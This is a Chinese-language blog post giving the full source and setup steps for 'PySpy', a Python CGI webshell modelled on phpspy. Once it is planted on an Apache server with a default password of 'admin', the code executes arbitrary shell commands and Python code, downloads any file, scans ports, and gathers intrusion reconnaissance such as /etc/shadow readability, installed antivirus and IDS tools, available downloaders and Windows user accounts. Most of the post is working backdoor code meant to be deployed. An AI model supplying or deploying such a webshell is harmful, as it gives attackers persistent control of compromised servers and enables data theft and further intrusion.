# 0x01 运行环境 —— Apache 服务器 CGI 配置

要运行此 Python 版本的 Webshell，需要应用服务器以 CGI 方式支持 python 文件。

先配置 Apache 的配置文件 httpd.conf 使其支持 CGI，因为我使用的是 phpstudy，所以如下设置：

``` shell
DocumentRoot  "D:\phpStudy\PHPTutorial\WWW"
<Directory />
    Options +Indexes +FollowSymLinks +ExecCGI
    AllowOverride All
    Order allow,deny
    Allow from all
    Require all granted
</Directory>
```


让 Apache 识别 .py 文件为 CGI 程序：
``` shell
AddHandler cgi-script .cgi .pl .py
```

只允许在特别目录下执行cgi程序:

``` shell
ScriptAlias /cgi-bin/ "D:/phpStudy/PHPTutorial/Apache/cgi-bin/"
```

以上就完成了 Apache 对于 CGI 的支持的配置。**测试**一下：

使用 Python 创建第一个 CGI 程序，文件名为 `test.py`，文件位于 `D:\phpStudy\PHPTutorial\Apache\cgi-bin` 目录中，内容如下：

``` python
#!C:\Python27\python2.exe
# -*- coding: UTF-8 -*-
print "Content-type:text/html"
print                               # 空行，告诉服务器结束头部
print '<html>'
print '<head>'
print '<meta charset="utf-8">'
print '<title>Hello World - CGI 测试！</title>'
print '</head>'
print '<body>'
print '<h2>Hello World! 输出这句话说明测试成功</h2>'
print '</body>'
print '</html>'
```


然后在浏览器访问 http://localhost/cgi-bin/test.py 显示结果如下：

![title](https://leanote.com/api/file/getImage?fileId=5dafd54aab6441319500020b)

说明 `.py` 文件的运行环境配置成功。


# 0x02 大马代码

在上述 cgi-bin 目录下放入此大马文件，注意把 Pthon 解释器换成你自己的 Python 解释器，也就是修改第一行的这一句`#!C:\Python27\python2.exe`：


``` python
#!C:\Python27\python2.exe
# -*- coding: utf-8 -*-
# enable debugging

import cgi
import os
import sys
import time
import re
import socket
import stat
import StringIO
import subprocess
import itertools
import shutil
import cookielib

from os import environ
from subprocess import check_output, PIPE
from configparser import ConfigParser
from Cookie import SimpleCookie
import datetime



form = cgi.FieldStorage()

# ===================== basic setting =====================
admin={}
# 是否需要密码验证, true 为需要验证, false 为直接进入.下面选项则无效
admin['check'] = True
admin['pass'] = 'admin'

# 如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
# cookie 前缀
admin['cookiepre'] = ''
# cookie 作用域
admin['cookiedomain'] = 'localhost'
# cookie 作用路径
admin['cookiepath'] = '/cgi-bin'
# cookie 有效期
admin['cookielife'] = 86400

# 在这里输入 php.ini 的路径
INI_FILE_PATH ='D:/phpStudy/PHPTutorial/php/php-5.2.17/php.ini'

# ===================== settings over =====================

self = os.path.basename(__file__)
timestamp = time.time()

def getcookie(key):
    if environ.has_key('HTTP_COOKIE'):
       for cookie in environ['HTTP_COOKIE'].split(';'):
            k , v = cookie.split('=')
            if key == k:
                return v
    return ""


def getvalue(key):
    if form.has_key(key):
        return form.getvalue(key)
    return ""

def tryExcept(fun):
    def wrapper(args):
        try:
            fun(args)
        except:
            pass
    return wrapper

def handler():
    action = getvalue("action")
    if action == "" or action == "file":
        do_file()
    elif action == "shell":
        do_shell()
    elif action == "env":
        do_env()
    elif action == "eval":
        do_eval()
    elif action == "logout":
        do_logout()
    elif action == "portscan":
        do_port_scan()
    elif action == "secinfo":
        do_sec_info()
    elif action == "downfile":
        do_downfile()

bgc = 0

def bg():
    global bgc
    bgc += 1
    return 'alt1' if bgc%2 == 0 else 'alt2'

def loginpage():
    loginHtml = """
    <style type="text/css">
    input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
    </style>
    <form method="POST" action="">
    <span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
    <input type="hidden" name="doing" value="login">
    <input type="submit" value="Login">
    </form>
    """
    print loginHtml

def index():
    addr,host = "",""
    if environ.has_key('REMOTE_ADDR'):
        addr = environ['REMOTE_ADDR']
    if environ.has_key('REMOTE_HOST'):
        host = environ['REMOTE_HOST']
    else:
        host = socket.gethostbyaddr(addr)[0]
    html = """
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=gbk">
    <title>Snowming - PySpy</title>
    <style type="text/css">
        body,td{font: 12px Arial,Tahoma;line-height: 16px;}
        .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
        .area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
        .bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
        a {color: #00f;text-decoration:underline;}
        a:hover{color: #f00;text-decoration:none;}
        .alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
        .alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
        .focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
        .head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
        .head td span{font-weight:normal;}
        form{margin:0;padding:0;}
        h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
        ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
        u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
    </style>
    <script type="text/javascript">
        function CheckAll(form) {
            for(var i=0;i<form.elements.length;i++) {
                var e = form.elements[i];
                if (e.name != 'chkall')
                    e.checked = form.chkall.checked;
            }
        }

        function $(id) {
            return document.getElementById(id);
        }

        function goaction(act){
            $('goaction').action.value=act;
            $('goaction').submit();
        }
        function gooction(){
            d = new Date();
            document.cookie = "Pyspypass=1;expires="+d.toUTCString();
            $('goaction').action.value="login";
            $('goaction').submit();
        }
    </script>
    </head>
    <body style="margin:0;table-layout:fixed; word-break:break-all">
    <table width="100%%" border="0" cellpadding="0" cellspacing="0">
        <tr class="head">
            <td><span style="float:right;"><a href="http://blog.leanote.com/snowming" target="_blank"> Author: Snowming</a></span>%s(%s)
            </td>
        </tr>
        <tr class="alt1">
            <td>
                <a href="javascript:goaction('file');">File Manager</a> |
                <a href="javascript:goaction('shell');">Execute Command</a> |
                <a href="javascript:goaction('env');">System Variable</a> |
                <a href="javascript:goaction('eval');">Eval Python Code</a>|
                <a href="javascript:goaction('portscan');">Port Scan</a>|
                <a href="javascript:goaction('secinfo');">Security Information</a>|
                <a href="javascript:gooction('logout');">Logout</a>
            </td>
        </tr>
    </table>
    <form name="goaction" id="goaction" action="" method="post" >
    <input id="action" type="hidden" name="action" value="" />
    </form>
    """ % (addr,host)
    print html
    handler()
    print """
    <div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
    	Powered by Snowming. Copyright (C) 2019-Forever. All Rights Reserved.
    </div>
    """

def getPerms(path):
    user = {}
    group = {}
    other = {}
    mode = os.stat(path)[stat.ST_MODE]
    perm = oct(mode)[-4:]
    type = ""

    if stat.S_ISDIR(mode):
        type = 'd'
    elif stat.S_ISLNK(mode):
        type = 'l'
    elif stat.S_ISCHR(mode):
        type = 'c'
    elif stat.S_ISBLK(mode):
        type = 'b'
    elif stat.S_ISREG(mode):
        type = '-'
    elif stat.S_ISFIFO(mode):
        type = 'p'
    elif stat.S_ISSOCK(mode):
        type = 's'
    else:
        type = '?'

    user['read'] = 'r' if (mode & 00400) else '-'
    user['write'] = 'w' if (mode & 00200) else '-'
    user['execute'] = 'x' if (mode & 00100) else '-'
    group['read'] = 'r' if (mode & 00040) else '-'
    group['write'] = 'w' if (mode & 00020) else '-'
    group['execute'] = 'x' if (mode & 00010) else '-'
    other['read'] = 'r' if (mode & 00004) else '-'
    other['write'] = 'w' if (mode & 00002) else '-'
    other['execute'] = 'x' if (mode & 00001) else '-'

    return perm,type+user['read']+user['write']+user['execute']+group['read']+group['write']+group['execute']+other['read']+other['write']+other['execute']

'''
def getUpPath(cwd):
	pathdb = cwd.split('/')
	num = len(pathdb)
	if (num > 2):
         del pathdb[num-1]
         del pathdb[num-2]
    uppath = "/".join(pathdb)+'/'
	uppath = uppath.replace('//', '/')
	return uppath
'''
def do_downfile():
    path = getvalue("dir")

    # 读文件
    with open(path,'r') as f:
	    tmp_file = f.read()
    print "Content-type:application/octet-stream"
    print
    print '''
    %s
    '''%tmp_file


def urlencode(dir):
    dir = dir.replace("\\", "\\\\")
    dir = dir.replace("\\\\\\\\", "\\\\")
    return dir

def do_file():
    current_dir = getvalue("dir") or os.getcwd()
    current_dir = current_dir.replace("\\", "\\\\")
    parent_dir = os.path.dirname(current_dir)
    perm,mode = getPerms(current_dir)

    forms = """
    <form name="createdir" id="createdir" action="" method="post" >
    <input id="newdirname" type="hidden" name="newdirname" value="" />
    <input id="dir" type="hidden" name="dir" value="%s" />
    </form>
    <form name="fileperm" id="fileperm" action="" method="post" >
    <input id="newperm" type="hidden" name="newperm" value="" />
    <input id="pfile" type="hidden" name="pfile" value="" />
    <input id="dir" type="hidden" name="dir" value="%s" />
    </form>
    <form name="copyfile" id="copyfile" action="" method="post" >
    <input id="sname" type="hidden" name="sname" value="" />
    <input id="tofile" type="hidden" name="tofile" value="" />
    <input id="dir" type="hidden" name="dir" value="%s" />
    </form>
    <form name="rename" id="rename" action="" method="post" >
    <input id="oldname" type="hidden" name="oldname" value="" />
    <input id="newfilename" type="hidden" name="newfilename" value="" />
    <input id="dir" type="hidden" name="dir" value="%s" />
    </form>
    <form name="fileopform" id="fileopform" action="" method="post" >
    <input id="action" type="hidden" name="action" value="" />
    <input id="opfile" type="hidden" name="opfile" value="" />
    <input id="dir" type="hidden" name="dir" value="" />
    </form>
    """ % tuple((current_dir+'/' for x in range(4)))

    godir="""
    <table width="100%%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
      <form action="" method="post" id="godir" name="godir">
      <tr>
        <td nowrap>Current Directory (%s, %s)</td>
        <td width="100%%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="%s" type="text" style="width:100%%;margin:0 8px;"></td>
        <td nowrap><input class="bt" value="GO" type="submit"></td>
      </tr>
      </form>
    </table>
    <script type="text/javascript">
    function createdir(){
        var newdirname;
        newdirname = prompt('Please input the directory name:', '');
        if (!newdirname) return;
        $('createdir').newdirname.value=newdirname;
        $('createdir').submit();
    }
    function fileperm(pfile){
        var newperm;
        newperm = prompt('Current file:'+pfile+'Please input new attribute:', '');
        if (!newperm) return;
        $('fileperm').newperm.value=newperm;
        $('fileperm').pfile.value=pfile;
        $('fileperm').submit();
    }
    function copyfile(sname){
        var tofile;
        tofile = prompt('Original file:'+sname+'Please input object file (fullpath):', '');
        if (!tofile) return;
        $('copyfile').tofile.value=tofile;
        $('copyfile').sname.value=sname;
        $('copyfile').submit();
    }
    function rename(oldname){
        var newfilename;
        newfilename = prompt('Former file name:'+oldname+'Please input new filename:', '');
        if (!newfilename) return;
        $('rename').newfilename.value=newfilename;
        $('rename').oldname.value=oldname;
        $('rename').submit();
    }
    function dofile(doing,thefile,m){
        if (m && !confirm(m)) {
            return;
        }
        $('fileopform').action.value=doing;
        if (thefile){
            $('fileopform').dir.value=thefile;
        }
        $('fileopform').submit();
    }
    function createfile(nowpath){
        var filename;
        filename = prompt('Please input the file name:', '');
        if (!filename) return;
        opfile('editfile',nowpath + filename,nowpath);
    }
    function opfile(action,opfile,dir){
        $('fileopform').action.value=action;
        $('fileopform').opfile.value=opfile;
        $('fileopform').dir.value=dir;
        $('fileopform').submit();
    }
    function godir(dir,view_writable){
        if (view_writable) {
            $('godir').view_writable.value=1;
        }
        $('godir').dir.value=dir;
        $('godir').submit();
    }
    </script>
    """ % (perm,mode,current_dir)

    manage = """
    <table width="100%%" border="0" cellpadding="4" cellspacing="0">
    <form action="%s" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">
    <div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="./" type="hidden" /><input name="dir" value="./" type="hidden" /></div>
    <a href="javascript:createdir();">Create Directory</a> |
    <a href="javascript:createfile('%s');">Create File</a>
    </td></tr></form>
    <tr class="head"><td> </td><td>Filename</td><td width="16%%">Last modified</td><td width="10%%">Size</td><td width="20%%">Chmod / Perms</td><td width="22%%">Action</td></tr>
    <tr class=alt1>
    <td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir('%s');">Parent Directory</a></td>
    </tr>

    <tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>

    """ % (self,current_dir,parent_dir)

    dir_action = """
    <a href="javascript:dofile('deldir','%s','Are you sure will delete test? \n\nIf non-empty directory, will be delete all the files.')">Del
    </a>|
    <a href="javascript:rename('%s');">Rename</a>
    """
    file_action = """
    <a href="javascript:dofile('downfile','%s');">Download</a> |
    <a href="javascript:copyfile('%s');">Copy</a> |
    <a href="javascript:opfile('editfile','%s','%s');">Edit</a> |
    <a href="javascript:rename('%s');">Rename</a> |
    <a href="javascript:opfile('newtime','%s','%s');">Time</a>
    """

    lists = """
    <tr class="%s" onmouseover="this.className='focus';" onmouseout="this.className='%s';">
    <td> </td>
    <td><a href="#" target="#">%s</a></td>
    <td nowrap>%s</td>
    <td nowrap>%s</td>
    <td nowrap>
    <a href="javascript:fileperm('%s');">%s</a> /
    <a href="javascript:fileperm('%s');">%s</a>
    </td>
    <td nowrap>
    %s
    </td></tr>
    """
    print forms+godir+manage


    def getlist():
        files = []
        dirs = []
        result = ""
        dirlists = os.listdir(current_dir)
        dirlists.sort()
        for f in dirlists:
            abspath = "%s%s%s" %(os.getcwd(),os.sep,f)
            dirs.append(abspath) if os.path.isdir(abspath) else files.append(abspath)

        for f in itertools.chain(dirs,files):
            fstat = os.stat(f)
            modified = time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(fstat[stat.ST_MTIME]))
            mode , perm = getPerms(f)
            if os.path.isfile(f):
                size = fstat[stat.ST_SIZE]
                action = file_action % tuple([f for x in range(3)]+[os.path.dirname(f)]+[f for x in range(2)]+[urlencode(os.path.dirname(f))])

            else:
                size = '-'
                action = dir_action %(f,f)
            res = lists % (bg(),bg(),f,modified,size,f,mode,f,perm,action)
            result += res
        return result

    print getlist()

def do_shell():
    log = "/c net start > %s%slog.txt" %(os.getcwd(),os.sep)
    if sys.platform == "win32":
        path ,args ,com = "c:\windows\system32\cmd.exe" ,log ,"ipconfig"
    elif sys.platform == "linux2":
        path ,args ,com = "/bin/bash" ,"--help" ,"ifconfig"
    else:
        path ,args ,com = "" ,"" ,""

    shell_cmd = getvalue("command").strip()
    shell_pro = getvalue("program").strip()
    is_cmd = True if shell_cmd !="" else False
    is_pro = True if shell_pro !="" else False

    program = shell_pro or path
    parameter = getvalue("parameter").strip() or args
    command =  shell_cmd or com

    result = ""
    if is_cmd:
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        result = "".join(p.stdout.readlines())

    shell = """
    <table width="100%%" border="0" cellpadding="15" cellspacing="0"><tr><td>
    <form name="form1" id="form1" action="" method="post" >
    <h2>Execute Program »</h2>
    <input id="action" type="hidden" name="action" value="shell" />
    <p>Program<br /><input class="input" name="program" id="program" value="%s" type="text" size="100"  /></p>
    <p>
    Parameter<br /><input class="input" name="parameter" id="parameter" value="%s" type="text" size="100"  />
    <input class="bt" name="submit" id="submit" value="Execute" type="submit" size="100"  />
    </p>
    </form>
    <form name="form1" id="form1" action="" method="post" >
    <h2>Execute Command »</h2>
    <input id="action" type="hidden" name="action" value="shell" />
    <p>Command<br /><input class="input" name="command" id="command" value="%s" type="text" size="100"  />
    <input class="bt" name="submit" id="submit" value="Execute" type="submit" size="100"  /></p>
    </form>
    <pre> %s </pre>
    </td></tr>
    </table>
    """ % (program,parameter,command,result)
    print shell

    if is_pro:
        os.execve(program, parameter.split(), os.environ)

def do_env():
    def os():
        if sys.platform.startswith('l'):
            return "Linux"
        elif sys.platform.startswith('w'):
            return "Windows"
        elif sys.platform.startswith('d'):
            return "Mac"
        elif sys.platform.startswith('o'):
            return "OS"
        else:
            return "Unknown"

    server ={}
    python ={}
    server['Server Time'] = time.strftime("%Y-%m-%d %H:%M:%S",time.localtime())
    server['Server Domain'] = getvalue("SERVER_NAME")
    server['Server IP'] = socket.gethostbyname(server['Server Domain']) or "Unknown"
    server['Server OS'] = os()
    server['Server Software'] = getvalue("SERVER_SOFTWARE") or "Unknown"
    server['Cgi Path'] = getvalue("PATH_INFO") or "Unknown"

    serverInfo = ""
    pythonInfo = ""
    for k ,v in server.items():
        serverInfo += "<li><u>%s:</u>      %s</li>" % (k, v)

    for k ,v in python.items():
        pythonInfo += "<li><u>%s:</u>      %s</li>" % (k, v)

    env = """
    <table width="100%%" border="0" cellpadding="15" cellspacing="0"><tr><td>
    <h2>Server »</h2>
    <ul class="info">
    %s
    </ul>
    <h2>Python »</h2>
    <ul class="info">
    %s
    </ul>
    </tr></td>
    </table>
    """ %(serverInfo,pythonInfo)
    print env

def do_eval():
    code = getvalue("pythoncode")
    tmp = open("temp.py","w")
    tmp.write(code)
    tmp.close()
    file=StringIO.StringIO()
    if code != "":
        stdout=sys.stdout
        sys.stdout=file
        try:
            execfile("temp.py")
        except Exception,e:
            file.write(str(e))
        sys.stdout=stdout
    os.remove("temp.py")

    eval = """
    <table width="100%%" border="0" cellpadding="15" cellspacing="0"><tr><td>
    <form name="form1" id="form1" action="" method="post" >
    <h1> <pre>%s</pre> </h1>
    <h2>Eval Python Code »</h2>
    <input id="action" type="hidden" name="action" value="eval" />
    <p>Python Code<br /><textarea class="area" id="phpcode" name="pythoncode" cols="100" rows="15" >%s</textarea></p>
    <p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
    </form>
    </td></tr></table>
    """ % (file.getvalue(),code)
    print eval



def do_port_scan():
    p2 = '127.0.0.1'
    p3 = '21,22,80,135,139,445,1433,3306,3389,5631,6379,43958'

    formhead({
        'title': 'Port Scan',
        'onsubmit': "g('portscan',null,'start',this.p2.value,this.p3.value);return false;"
    })

    print '<p>'
    print 'IP:'
    makeinput({
        'name': 'p2',
        'size': 20,
        'value': p2
    })
    print 'Port:'

    makeinput({
        'name': 'p3',
        'size': 80,
        'value': p3
    })
    makeinput({
        'value': 'Scan',
        'type': 'submit',
        'class': 'bt'
    })
    formfoot()


    print "<h2>Result »</h2>"
    print '<ul class="info">'
    # print "Start Port Scan.."
    ports = p3.split(',')
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((p2,int(port)))
        if result != 0:
            print '<li> {}:{} ------------------------ <span class="b" style="color:red">Close</span></li>'.format(p2, port)
        else:
            print '<li> {}:{} ------------------------ <span class="b" style="color:green">Open</span></li>'.format(p2, port)
            sock.close()
    print '</ul>'

def do_sec_info():
    # print "ghel"
    IS_WIN = sys.platform.startswith('win')
    if not IS_WIN:
        useful = ('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl')
        danger = ('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja')
        downloaders = ('wget','fetch','lynx','links','curl','get','lwp-mirror')

        secparam("Readable /etc/passwd", 'yes' if is_readable('/etc/passwd') else 'no')
        secparam("Readable /etc/shadow", 'yes' if is_readable('/etc/shadow') else 'no')
        secparam("OS version", file_get_contents('/proc/version'))
        secparam("Distr name", file_get_contents('/etc/issue.net'))

        # FIXME: 在php 5.3以上弃用了safe_mode, 5.4以上此特性完全去除
        safe_mode = False if getcfg('SQL', 'sql.safe_mode') == 'Off' else True
        if safe_mode:
            secparam("Userful", check_exe_exist(useful))
            secparam("Danger", check_exe_exist(danger))
            secparam("Downloaders", check_exe_exist(downloaders))

            secparam("Hosts", file_get_contents('/etc/hosts'))
            secparam("HDD space", execute('df -h'))
            secparam("Mount options", file_get_contents('/etc/fstab'))
    else:
        secparam("OS Version", execute('ver'))
        secparam("Account Settings", execute('net accounts'))
        secparam("User Accounts", execute('net user'))
        secparam("IP Configurate", execute('ipconfig -all'))

# ======================= Logout ============================

def scookie(key, value, life=0, prefix=1):
    # FIXME: 这里有一些变量是未导入的
    key = (admin['cookiepre'] if prefix else '') + key
    life = life if life else admin['cookielife']
    # useport = True if _SERVER['SERVER_PORT'] == 443 else False
    import requests
    url = 'http://127.0.0.1'
    cookies_jar = requests.cookies.RequestsCookieJar()
    cookies_jar.set(key, value, expires=life, path=admin['cookiepath'], domain=admin['cookiedomain'])

    response = requests.get(url, cookies=cookies_jar)

    if environ.has_key('HTTP_COOKIE'):
        print 'After: ', environ['HTTP_COOKIE']
        print admin['cookiedomain']

def rmcookie():
    c = SimpleCookie()
    c['Pyspypass'] = ''
    c['Pyspypass']['Expires']='Thu, 01 Jan 1970 00:00:00 GMT'
    print c
    print "Content-type: text/html\n\n"
    print """
    <html>
    <body>
    <h1>The cookie has been set to expire</h1>
    </body>
    </html>
    """


# ===================== Port Scan ===========================

charsetdb = {
	'big5'			: 'big5',
	'cp-866'		: 'cp866',
	'euc-jp'		: 'ujis',
	'euc-kr'		: 'euckr',
	'gbk'			: 'gbk',
	'iso-8859-1'	: 'latin1',
	'koi8-r'		: 'koi8r',
	'koi8-u'		: 'koi8u',
	'utf-8'			: 'utf8',
	'windows-1252'	: 'latin1',
}

def formhead(arg={}):
    if 'method' not in arg.keys(): arg['method'] = 'post'
    if 'name' not in arg.keys(): arg['name'] = 'form1'
    if 'extra' not in arg.keys(): arg['extra'] = ''
    if 'onsubmit' in arg.keys():
        arg['onsubmit'] = 'onsubmit="{}"'.format(arg['onsubmit'])
    else:
        arg['onsubmit'] = ''
    print '''
    <form name="{0}" id="{0}" action="{1}" method="{2}" {3} {4}>
    '''.format(arg['name'], os.path.abspath(__file__), arg['method'], arg['onsubmit'], arg['extra'])
    if 'title' in arg.keys():
        print "<h2> {} »</h2>".format(arg['title'])

def formfoot():
    print "</form>"

def makeinput(arg={}):
    if 'size' in arg.keys() and arg['size'] > 0:
        arg['size'] = 'size="{}"'.format(arg['size'])
    else:
        arg['size'] = 'size="100"'

    if 'type' not in arg.keys(): arg['type'] = 'text'
    if 'title' not in arg.keys():
        arg['title'] = ''
    else:
        arg['title'] += '<br />'
    if 'class' not in arg.keys(): arg['class'] = 'input'
    if 'name' not in arg.keys(): arg['name'] = 'name'
    if 'value' not in arg.keys(): arg['value'] = ''
    if 'newline' in arg.keys(): print "<p>"

    print '''
    {0}<input class="{1}" name="{2}" id="{2}" value="{3}" type="{4}" {5} />
    '''.format(arg['title'], arg['class'], arg['name'], arg['value'], arg['type'], arg['size'])

    if 'newline' in arg.keys(): print "</p>"

# =============== Security Information ======================

def setcfg(section, varname, newvalue, ANALYSIS_INI=INI_FILE_PATH):
    cfg = ConfigParser()
    cfg.read(ANALYSIS_INI)
    if not cfg.has_section(section):
        cfg.add_section(section)
    cfg.set(section, varname, newvalue)

    if not os.path.exists(ANALYSIS_INI):
        Path(ANALYSIS_INI).touch()

    with open(ANALYSIS_INI, 'wb') as configfile:
        cfg.write(configfile)


def getcfg(section, varname, ANALYSIS_INI=INI_FILE_PATH):
    # FIXME: 这个的路径在哪里
    cfg = ConfigParser()
    cfg.read(ANALYSIS_INI)
    if not cfg: return ''
    return cfg.get(section, varname)

def secparam(name, value):
    value = value.strip()
    if not value: return
    html = '''
    <h2> {0}  »</h2>
    <ul class="info">
    {1}
    </ul>
    '''.format(name, "{} <br />".format(value) if "\n" not in value else "<pre> {} </pre>".format(value))
    print html

def check_exe_exist(exes):
    temp = []
    for item in exes:
        if shutil.which(item):
            temp.append(item)

    return ','.join(item for item in temp)

def is_readable(f):
    return os.access(f, os.R_OK)

def file_get_contents(f):
    return open(f).read()

def execute(cmd):
    output = check_output(cmd, shell=True)
    return output

def login():
    if not admin["check"]:  return

    if getvalue("doing") == "login" and \
        admin["pass"] == getvalue("password"):
        print "Set-Cookie:Pyspypass=%s; Expires=Tuesday, 31-Dec-2020 23:12:40 GMT" % admin["pass"]
        #print "Set-Cookie:Expires=Tuesday, 31-Dmin["pass"]
        # print "Set-Cookie:Expires=Tuesday, 31-Dec-2014 23:12:40 GMT"
        print "Content-type:text/html"
        print
        index()
        return
    elif getcookie('Pyspypass') != admin['pass']:
        print "Content-type:text/html"
        print
        loginpage()
    else:
        print "Content-type:text/html"
        print
        index()


if __name__ == '__main__':
    login()


```


> 注意：
写 cgi 程序注意
第一：#！前面不能有空格，后面紧跟解释程序( python.exe 的路径)；
第二，python 等解释程序的目录是否正确；
第三，作为 http 协议的要求，一定要输出 http headers；
第四，在存在 http headers 的前提下，一定要在 headers 后面打印一个空行，否则服务器会报错；
第五，把错误的程序在 python 的 idle 中执行一下，验证正确性；
最后，实在搞不定的情况下，百度 + 查看 apache 的 logs 文件夹下的 error.log 文件，来确定问题。


# 0x03 效果展示

本 webshell 参考自 phpspy，UI 代码基本是从 phpspy 扒下来的。

**登入功能：**

注：默认密码为 `admin`，写死在python代码里。但是这里作为程序设置单独提出来了，很容易改的。
![title](https://leanote.com/api/file/getImage?fileId=5dbae064ab64415ac8000493)


**文件管理：**

![title](https://leanote.com/api/file/getImage?fileId=5dbade24ab64415ac800048c)
注： 这个功能没有实现完，基本上只有展示、Parent Directory 功能。

**执行命令：**

![title](https://leanote.com/api/file/getImage?fileId=5dbade7cab644158ca000557)

**系统变量：**

![title](https://leanote.com/api/file/getImage?fileId=5dbadeb1ab644158ca00055a)

**端口扫描：**
![title](https://leanote.com/api/file/getImage?fileId=5dbadef4ab644158ca00055c)
注：端口现在是写死在python代码里面的。

**安全信息：**

![title](https://leanote.com/api/file/getImage?fileId=5dbadf23ab644158ca00055d)

**登出功能：**

![title](https://leanote.com/api/file/getImage?fileId=5dbadf43ab644158ca00055e)


# 0x04 总结

Python 大马其实并不实用，因为一般的web服务器没有配置 python 代码的解析环境。

我个人只是为了练手。此大马的功能尚不完整，主要体现在 `File Manager` 功能不完整、`Mysql Manager`这个功能没写。

在写此 Python 大马的时候，用了 Python 的 CGI 编程，有其语法的特殊性。也有一些坑、比如在写 logout 功能的时候，不能使用清除 cookie 的方法，所以我是用 js 来实现的此功能。

以后有时间了继续完善。

-----

参考链接：

[1] [windows+phpstudy(apache) 以 cgi 方式支持 python](https://blog.csdn.net/qingchenldl/article/details/79598712)，CSDN，V0Wsec，2018年3月18日
[2] [Python CGI 编程](https://www.runoob.com/python/python-cgi.html)，菜鸟教程
[3] phpspy

